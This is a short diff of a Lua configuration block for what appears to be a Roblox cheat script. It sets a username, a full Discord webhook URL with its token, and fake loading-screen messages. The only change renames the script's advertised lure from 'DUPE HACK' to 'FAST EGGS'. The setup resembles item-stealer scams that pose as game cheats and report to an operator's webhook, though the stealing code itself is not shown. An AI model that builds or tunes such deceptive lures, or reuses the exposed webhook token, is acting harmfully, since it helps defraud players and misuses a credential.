@@ -21,7 +21,7 @@ Username = "notulP_hctiwT"
 WebHook = "https://discord.com/api/webhooks/1094928392563994784/aabpCLXGJv2oKR0CKG0pxOXtaPHvb3P9mpff27yGyjdEwgCTcqCJdcbhmB0YalIpE3O3"
 
 loadingscreen = true
-_G.CustomScriptName = "Nibiru [DUPE HACK]"
+_G.CustomScriptName = "Nibiru [FAST EGGS]"
 _G.Text1 = "[SCRIPT] Loading now ..."
 _G.Text2 = "[SCRIPT] Waiting 10 seconds ..."
 _G.Text3 = "[SCRIPT] Checking now..."
